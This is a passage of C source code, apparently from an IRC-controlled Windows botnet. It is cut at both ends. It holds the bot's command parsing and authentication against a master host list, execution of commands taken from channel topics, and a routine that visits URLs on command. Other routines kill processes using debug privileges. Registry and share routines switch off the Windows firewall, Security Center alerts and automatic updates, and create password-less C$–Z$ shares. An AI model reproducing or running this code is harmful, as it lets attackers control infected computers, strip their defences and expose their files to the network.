	HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,lPid);
	if(hProcess) {
		TerminateProcess(hProcess, 0);
		bRetVal=TRUE;
		CloseHandle(hProcess);
	}
	
	DropDebugPrivs(hToken,tPrivOld);

	
	return bRetVal;
}

PCHAR ProcessPidToName(DWORD ProcessId,PCHAR ProcessName) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded)) return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	strcpy(ProcessName,"???");

	for ( int i = 0; i < cProcesses; i++ )
	{
	  HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
		if ( hProcess )
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if ( fEnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
			{

				if (ProcessId == aProcesses[i]) {
					fGetModuleFileNameEx( hProcess, hMod, szProcessName,sizeof(szProcessName) );
					sprintf(ProcessName,"%s",szProcessName);
					return ProcessName;
				}
					
			
			}
			CloseHandle( hProcess );
		}
	}
	
	return ProcessName;
}
#endif


THREAD threads[MAX_THREADS];

// function to add description to thread list and return thread number
int addthread(int id, char *name,...)
{
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,name); 
	_vsnprintf(tbuffer,sizeof(tbuffer),name,argp);
	
	int i;
	for (i = 0; i < MAX_THREADS; i++) {
		if (threads[i].name[0] == '\0') {
			strncpy(threads[i].name, tbuffer, sizeof(threads[i].name)-1);
			threads[i].id=id;
			threads[i].parent=0;
			threads[i].pid=0;
			break;
		}
	}
	return i;
}

BOOL killthread(int threadnum)
{
	BOOL threadkilled = FALSE;

	if ((threadnum>0) && (threadnum<MAX_THREADS))
	{
		TerminateThread(threads[threadnum].tHandle, 0);
		if (threads[threadnum].tHandle != 0) 
			threadkilled = TRUE;

		threads[threadnum].tHandle = 0;
		threads[threadnum].id = 0;
		threads[threadnum].parent = 0;

#ifndef NO_PROCESS
		if(threads[threadnum].pid > 0)
			KillPid(threads[threadnum].pid);
#endif

		threads[threadnum].pid = 0; 
		threads[threadnum].name[0] = '\0';
		fclosesocket(threads[threadnum].csock);
		threads[threadnum].csock = 0;
	}

	return threadkilled;
}

int killthreadall(void)
{
	int numthreads=0;

	for (int i = 0; i < MAX_THREADS; i++)
		if (threads[i].name[0] != '\0')
			if (killthread(i))
				numthreads++;

	return numthreads;
}

int killthreadid(int threadid, int threadnum)
{
	int numthreads=0;

	for (int i=0;i<MAX_THREADS;i++)
	{
		if (threads[i].id == threadid)
		{
			if (threadnum > 0)
			{
				if (threads[i].parent == threadnum || i == threadnum)
					if (killthread(i)) 
						numthreads++;
			}
			else 
			{
				if (killthread(i)) 
					numthreads++;
			}
		}
	}

	return numthreads;
}

void clearthread(int threadnum)
{
	threads[threadnum].tHandle = 0;
	threads[threadnum].id=0;
	threads[threadnum].parent=0;
	threads[threadnum].pid=0;
	threads[threadnum].csock=0;
	threads[threadnum].name[0]='\0';

	return;
}

void stopthread(char *target, void* conn, BOOL silent, BOOL verbose, char *thread, int threadid, char *desc)
{
	IRC* irc=(IRC*)conn;
	int threadnum=0, i;

	if(thread)
		threadnum=atoi(thread);

#ifdef _DEBUG
	printf("stopthread: s:%s\n",(silent?"T":"F"));
	printf("stopthread: T:%s\n",target);
#endif

	if ((i=killthreadid(threadid,threadnum)) > 0)
	{
		if (!silent)
			irc->privmsg(target,"%s %s thread stopped. (%d thread(s) stopped.)", threads_title, desc, i);
	}
	else
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s No %s thread found.", threads_title, desc);
	}

	return;
}

DWORD WINAPI ListThread(LPVOID param) 
{
	NTHREAD tlist = *((NTHREAD *)param);
	NTHREAD *tlistp = (NTHREAD *)param;
	tlistp->gotinfo = TRUE;
	
	IRC* irc=(IRC*)tlist.conn;

	irc->privmsg(tlist.target,"%s Thread List:", threads_title);
	for (int i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].name[0] != '\0' && (tlist.bdata1 || threads[i].parent == 0))
		{
			irc->privmsg(tlist.target,"%d. %s", i, threads[i].name);
		}
	}
	irc->privmsg(tlist.target,"%s End of list.", threads_title);
	clearthread(tlist.threadnum);
	ExitThread(0);
}

void listthreads(char *target, void* conn, BOOL verbose, BOOL full)
{
	IRC* irc=(IRC*)conn;

	if (verbose) irc->privmsg(target,"%s Thread List:", threads_title);

	for (int i = 0; i < MAX_THREADS; i++)
	{
		if (threads[i].name[0] != '\0' && (full || threads[i].parent == 0))
		{
			irc->privmsg(target,"%d. %s", i, threads[i].name);
		}
	}

	if (verbose) irc->privmsg(target,"%s End of list.", threads_title);

	return;
}

int findthreadid(int threadid)
{
	int numthreads=0;
	for (int i=0;i<MAX_THREADS;i++)
		if (threads[i].id == threadid)
			numthreads++;

	return numthreads;
}

int findthreadnum(int threadid)
{
	int threadnum=0;
	for (int i=0;i<MAX_THREADS;i++)
		if (threads[i].id == threadid)
		{
			threadnum=i;
			break;
		}

	return threadnum;
}


extern char str_auth_good[];
extern char str_auth_full[];
extern char str_auth_bad[];
extern char str_spy_privmsg[];
extern char str_kick_msg[];

#ifdef NO_GET_IP_HTTP
extern char str_exip_resolve[];
#endif


SWITCHES GetSwitches(char *a[MAX_TOKENS],int t)
{
	SWITCHES rswitch;

	unsigned char switches[256];
	ZeroMemory(switches,sizeof(switches));
	for (int i=t; i>=0; i--) {
		if (a[i])
		{ 
			if ((a[i][0] == '-') && (a[i][2] == 0))
			{	// -a
				switches[a[i][1]]=1;
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else if ((a[i][0] == '-') && (a[i][2] == ':') && (a[i][4] == 0))
			{	// -r:*
				switches[a[i][1]]=1;
				if (a[i][1] == 'r')
					rswitch.replace_char=a[i][3];
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else
				break;
		}
	}

	rswitch.silent	= (switches['s']);
	rswitch.halfsilent = (switches['h']);
	rswitch.verbose = (switches['v']);
	rswitch.stop	= (switches['S']);
	rswitch.force	= (switches['f']);

	rswitch.createwait = (switches['W']);
	rswitch.replace_underscores = (switches['r']);
	rswitch.overwrite			= (switches['O']);
	rswitch.attrib_hidden		= (switches['H']);
	rswitch.attrib_normal		= (switches['N']);
	rswitch.attrib_readonly		= (switches['R']);
	rswitch.attrib_system		= (switches['S']);//this is also stop, but the file control
												 //doesnt use a thread so it should still be fine
	rswitch.scan_a = (switches['a']);
	rswitch.scan_b = (switches['b']);
	rswitch.scan_c = (switches['c']);
	rswitch.scan_r = (switches['r']);
	rswitch.scan_e = (switches['e']);

	rswitch.netstat_noresolve = (switches['N']);
	rswitch.netstat_all = (switches['a']);
	
	return rswitch;
}



int private_msg(char* params, irc_reply_data* hostd, void* conn)
{

	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	params++;

	char fcmd[1024];
	strcpy(fcmd,params);
	int t=SplitParams(a,params,MAX_TOKENS);
	if (fcmd[0] == prefix)
	{
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;

			if (irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
				if (!strcmp(hostd->target,irc->current_nick()))	// If its a private msg the target
					hostd->target=hostd->nick;					// should turn into the person sending the message

				IRC_CommandParse(a,t,fcmd,hostd,irc,switches);
				
			}
			else
			{
				if (!strcmp(hostd->target,irc->current_nick()))
				{
#ifndef NO_SPY_WARNING
					if (irc->has_master())
						irc->notice_masters(str_spy_privmsg,warn_title,hostd->nick,hostd->ident,hostd->host,fcmd);
					else
						irc->privmsg(servers[curserver].warningchan,str_spy_privmsg,warn_title,hostd->nick,hostd->ident,hostd->host,fcmd);
					
					return 1;
#endif
					hostd->target=hostd->nick;
				}

				if (!strcmp(a[0],cmd_login_1))
				{
					if (a[1]==NULL)
						return 1;

					
					char h[256];
					_snprintf(h,sizeof(h),"%s!%s@%s",hostd->nick,hostd->ident,hostd->host);
					BOOL host_ok=FALSE;
					for (int i=0; i < authsize; i++) {
#ifndef NO_WILDCARD
						if (wildcardfit(authost[i], h)) { 
							host_ok = TRUE;
							break;
						}
#else
						if (strcmp(h, authost[i]) == 0) {
							host_ok = TRUE;
							break;
						}
#endif
					}

					if (!host_ok || strcmp(password, a[1]) != 0) {
						if (irc->has_master())
							irc->notice_masters(str_auth_bad,warn_title,hostd->nick,hostd->ident,hostd->host,a[1]);
						else
							irc->privmsg(servers[curserver].warningchan,str_auth_bad,warn_title,hostd->nick,hostd->ident,hostd->host,a[1]);

						return 1;
					}

					if (irc->add_login(hostd->nick,hostd->ident,hostd->host) == -1)
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,str_auth_full,main_title);
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,str_auth_good,main_title);
					}


					return 1;
				}
			}
		} 
	}//if fcmd==prefix
	else
	{
		if (lstrcmpi(hostd->target,irc->current_nick()))
			return 1;

		if (!lstrcmpi("\1VERSION\1",a[0]))
		{
#ifndef NO_VERSION_REPLY
			irc->notice(hostd->nick,"\1VERSION %s\1",versionlist[curversion]);
#endif//NO_VERSION_REPLY
			if (!irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
#ifndef NO_SPY_WARNING
				if (irc->has_master())
					irc->notice_masters("%s Version request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
				else
					irc->privmsg(servers[curserver].warningchan,"%s Version request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
#endif//NO_SPY_WARNING
			}
			return 1;
		}
		
		if (!lstrcmpi("\1PING",a[0]) && a[1])
		{
#ifndef NO_PING_REPLY
			irc->notice(hostd->nick,"\1PING %s",a[1]);
#endif//NO_PING_REPLY
			if (!irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
#ifndef NO_SPY_WARNING
				if (irc->has_master())
					irc->notice_masters("%s Ping request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
				else
					irc->privmsg(servers[curserver].warningchan,"%s Ping request from: %s!%s@%s",warn_title,hostd->nick,hostd->ident,hostd->host);
#endif//NO_SPY_WARNING
			}
			return 1;
		}

	}

	return 0;
}

int got_kicked(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	if (strstr(params,irc->current_nick()))
	{
		char *a[2];
		SplitParams(a,params,2);
		if (a[0] && a[1])
		{
			//a[0]=channel
			//a[1]=nick getting kicked
			if (!strcmp(a[0],servers[curserver].chan))
				irc->join(servers[curserver].chan, servers[curserver].chanpass);
			else
				irc->join(a[0]); // hopefully there is no key set

			irc->privmsg(a[0],str_kick_msg,hostd->nick);
		}
	}
	return 0;
}

int parse_topic(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	
	char tstr[IRCLINE];
	char chan[16];
	strncpy(tstr,params,sizeof(tstr));
	char *a[3];
	SplitParams(a,tstr,3);
	if (a[0] && a[1])
	{
		if (!strcmp(a[0],irc->current_nick()))
			strncpy(chan,a[1],sizeof(chan));
		else
			strncpy(chan,a[0],sizeof(chan));

		char *cmd;
		cmd=strchr(params,':');	
		cmd++;
#ifdef _DEBUG
		printf("Topic: \"%s\" by: %s\n",cmd,a[0]);
#endif
		// multiple topic cmds

		char *cmds[MAX_TOKENS];
		cmds[0]=strtok(cmd,"|");
		int i;
		for (i=1;i<MAX_TOKENS;i++)
		{
			cmds[i]=strtok(NULL,"|");
			if (cmds[i])
				continue;
			else
				break;
		}

		irc_reply_data thostd;
		thostd.target=chan;
		thostd.nick="topic";
		thostd.ident="topic";
		thostd.host="topic";

		char tstr[512];
		for (int t=0;t<i;t++)
		{
			if (cmds[t])
			{
				sprintf(tstr,"%s",cmds[t]);
				if (tstr[0]==prefix)
				{
					Sleep(FLOOD_DELAY/2);
					IRC_TempCommand(tstr,&thostd,conn,TRUE,TRUE);
				}
			}
		}
	}

	return 0;
}

int end_of_motd(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	
	DWORD id;
#ifndef NO_GET_IP_HTTP
	CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
#endif
	NTHREAD pt;
	pt.conn=conn;
	pt.gotinfo=FALSE;
	CreateThread(NULL, 0, &PingTimeoutThread, &pt, 0, &id);
	while (!pt.gotinfo)
		Sleep(50);

#ifdef NO_GET_IP_HTTP
	irc->raw("USERHOST %s", irc->current_nick()); // get_ext_ip() (302)
#endif
#ifndef NO_MODEONCONN
	irc->mode(servers[curserver].modeonconn);
#endif
	irc->join(servers[curserver].chan, servers[curserver].chanpass);

	return 0;
}

#ifdef NO_GET_IP_HTTP
int get_ext_ip(char* params, irc_reply_data* hostd, void* conn)
{
	char *a[1];
	IN_ADDR iaddr;
	
	SplitParams(a,params,2);
	strtok(a[1], "@");
	char *host = strtok(NULL, "@");
	DWORD addr = host2ip(host);
	
	// external ip
	iaddr.S_un.S_addr = addr;
	strcpy(exip, finet_ntoa(iaddr));
	
	// hostname  
	HOSTENT *hostent=fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
    if (hostent != NULL)
		strncpy(::host,hostent->h_name,sizeof(::host));
    else 
		strncpy(::host,str_exip_resolve,sizeof(::host));

	return 0;
}
#endif

#ifndef NO_MODEONJOIN
int joined_chan(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *a[1];
	SplitParams(a,params,2);
	if (a[0] && a[1])
	{
		//a[0]=nick
		//a[1]=channel
		if (strcmp(servers[curserver].modeonjoin,""))
			irc->mode(a[1], servers[curserver].modeonjoin, 0);
	}
	return 0;
}
#endif

int nick_in_use(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
	return 0;
}

void HookProtocol(void *conn)
{
	IRC* irc=(IRC*)conn;
	irc->hook_irc_command("PRIVMSG",&private_msg);
	irc->hook_irc_command("KICK",	&got_kicked);
	irc->hook_irc_command("TOPIC",	&parse_topic);
	irc->hook_irc_command("332",	&parse_topic);
#ifndef NO_MODEONJOIN
	irc->hook_irc_command("366",	&joined_chan);
#endif
	irc->hook_irc_command("005",	&end_of_motd); //not really end of motd
#ifdef NO_GET_IP_HTTP
	irc->hook_irc_command("302",	&get_ext_ip);
#endif
	//irc->hook_irc_command("376",	&end_of_motd);
	//irc->hook_irc_command("422",	&end_of_motd);
	irc->hook_irc_command("433",	&nick_in_use);
}


#ifndef NO_VISIT

DWORD WINAPI VisitThread(LPVOID param)
{
	HINTERNET ch = 0, req = 0;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[IRCLINE];

	NTHREAD visit = *((NTHREAD *)param);
	NTHREAD *visits = (NTHREAD *)param;
	IRC* irc=(IRC*)visit.conn;
	visits->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!fInternetCrackUrl(visit.data1, strlen(visit.data1), 0, &url)) {
			sprintf(sendbuf,"%s Invalid URL.", visit_title);
			break;
		}

		// copy url parts into variables
		if (url.dwHostNameLength > 0)
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		int vport = url.nPort;
		if (url.dwUserNameLength > 0)
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0)
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0)
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = fInternetConnect(ih, vhost,(unsigned short)vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"%s Could not open a connection.", visit_title);
			break;
		}

		req = fHttpOpenRequest(ch, NULL, vpath, NULL, visit.data2, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"%s Failed to connect to HTTP server.", visit_title);
			break;
		}

		if (fHttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"%s URL visited.", visit_title);
		else
			sprintf(sendbuf,"%s Failed to get requested URL from HTTP server.", visit_title);
	} while(0);

	if (!visit.silent) irc->privmsg(visit.target, sendbuf);

	fInternetCloseHandle(ch);
	fInternetCloseHandle(req);

	clearthread(visit.threadnum);

	ExitThread(0);
}
#endif


#ifndef NO_SECURE

char *stoplist[] = { "Tlntsvr",	"RemoteRegistry",	"Messenger", "SharedAccess",		 "wscsvc" };
char *stopnames[]= { "Telnet",	"Remote Registry",	"Messenger", "Windows Firewall/ICS", "Security Center" };

REGENT SecureReg[]={
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"UpdatesDisableNotify",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusOverride",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallOverride",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update",	"AUOptions",				REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\wscsvc",								"Start",					REG_DWORD,	0x00000004,	0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TlntSvr",								"Start",					REG_DWORD,	0x00000004, 0x00000003},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry",						"Start",					REG_DWORD,	0x00000004, 0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\Messenger",							"Start",					REG_DWORD,	0x00000004, 0x00000004},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Lsa",									"restrictanonymous",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",					"DoNotAllowXPSP2",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"Software\\Microsoft\\OLE",													"EnableDCOM",				REG_SZ,		0x00000000, 0x00000000, "N", "Y"},
	/*{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000}*/
};

NETSHARES ShareList[]={
	{(LPTSTR)L"IPC$",NULL},
	{(LPTSTR)L"ADMIN$",NULL},
	{(LPTSTR)L"C$",(LPTSTR)L"C:\\"},{(LPTSTR)L"D$",(LPTSTR)L"D:\\"},
	{(LPTSTR)L"E$",(LPTSTR)L"E:\\"},{(LPTSTR)L"F$",(LPTSTR)L"F:\\"},
	{(LPTSTR)L"G$",(LPTSTR)L"G:\\"},{(LPTSTR)L"H$",(LPTSTR)L"H:\\"},
	{(LPTSTR)L"I$",(LPTSTR)L"I:\\"},{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},
	{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},{(LPTSTR)L"K$",(LPTSTR)L"K:\\"},
	{(LPTSTR)L"L$",(LPTSTR)L"L:\\"},{(LPTSTR)L"M$",(LPTSTR)L"M:\\"},
	{(LPTSTR)L"N$",(LPTSTR)L"N:\\"},{(LPTSTR)L"O$",(LPTSTR)L"O:\\"},
	{(LPTSTR)L"P$",(LPTSTR)L"P:\\"},{(LPTSTR)L"Q$",(LPTSTR)L"Q:\\"},
	{(LPTSTR)L"R$",(LPTSTR)L"R:\\"},{(LPTSTR)L"S$",(LPTSTR)L"S:\\"},
	{(LPTSTR)L"T$",(LPTSTR)L"T:\\"},{(LPTSTR)L"U$",(LPTSTR)L"U:\\"},
	{(LPTSTR)L"V$",(LPTSTR)L"V:\\"},{(LPTSTR)L"W$",(LPTSTR)L"W:\\"},
	{(LPTSTR)L"X$",(LPTSTR)L"X:\\"},{(LPTSTR)L"Y$",(LPTSTR)L"Y:\\"},
	{(LPTSTR)L"Z$",(LPTSTR)L"Z:\\"}
};

void SecureRegistry(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;

	int written=0,failed=0;
	for(int i=0;i < (sizeof(SecureReg)/sizeof(*SecureReg));i++)
	{
		if (SecureReg[i].type==REG_DWORD)
		{
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].data1:SecureReg[i].data2)))
			{
				written++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
		}
		else if (SecureReg[i].type==REG_SZ)
		{
			written++;
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].sdata1:SecureReg[i].sdata2)))
			{
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
		}
	}
	if (written==0)
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Failed to %s Registry. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
	else
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Registry %s. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
}

void SecureShares(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	char sendbuf[IRCLINE];
	char tmpBuffer[IRCLINE];
	int shdel=0;
	int shmake=0;

	if (secure)
	{
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
			
		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",sec_title,"erased");

		do
		{
			nStatus=fNetShareEnum(NULL,502,(LPBYTE *)&pBuf,-1,&entriesread,&totalread,&resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA)
			{
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++)
				{
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$')
					{
						if(fNetShareDel(NULL,(unsigned short *)p->shi502_netname,0) == NERR_Success)
						{
							if (!loop && !silent && verbose)
							{
								if (shdel>0)
									strcat(sendbuf,",");
								sprintf(tmpBuffer," %S",p->shi502_netname);
								strcat(sendbuf,tmpBuffer);
							}
							shdel++;
						}
					}
					p++;
				}
				fNetApiBufferFree(pBuf);
			}
			else
			{
				for(int i=0;i < (sizeof(ShareList)/sizeof(*ShareList));i++)
				{
					if(fNetShareDel(NULL,(unsigned short *)ShareList[i].ShareName,0) == NERR_Success)
					{
						if (!loop && !silent && verbose)
						{
							if (shdel>0)
								strcat(sendbuf,",");

							sprintf(tmpBuffer," %S",ShareList[i].ShareName);
							strcat(sendbuf,tmpBuffer);
						}
						shdel++;
					}
				}
			}
		} while (nStatus == ERROR_MORE_DATA);

		if (verbose && !loop && !silent)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","erased",shdel);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!loop && !silent && !verbose)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",sec_title,"erased",shdel);
			}
		}

	}
	else
	{ // Unsecure

		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",unsec_title,"created");

		NET_API_STATUS res;
		SHARE_INFO_2 p;
		DWORD parm_err = 0;
		for (int i=0;i < (sizeof(ShareList) / sizeof (*ShareList));i++)
		{
			p.shi2_netname = (unsigned short *)TEXT(ShareList[i].ShareName);   
			p.shi2_type = STYPE_DISKTREE;
			p.shi2_remark = (unsigned short *)TEXT("rofl");
			p.shi2_permissions = 0;
			p.shi2_max_uses = 4;
			p.shi2_current_uses = 0;
			p.shi2_path = (unsigned short *)TEXT(ShareList[i].SharePath);
			p.shi2_passwd = NULL;
			res=fNetShareAdd(NULL,2,(LPBYTE)&p,&parm_err);
			if(res==0)
			{
				if (!loop && !silent && verbose)
				{
					if (shmake>0)
						strcat(sendbuf,",");

					sprintf(tmpBuffer," %S",ShareList[i].ShareName);
					strcat(sendbuf,tmpBuffer);
				}
				shmake++;
			}
		}
		if (verbose && !loop && !silent)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","created",shmake);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!verbose && !silent && !loop)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",unsec_title,"created",shmake);
			}
//			addlog(MAINLOG,sendbuf);
		}
	}
	return;
}

void SecureServices(void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
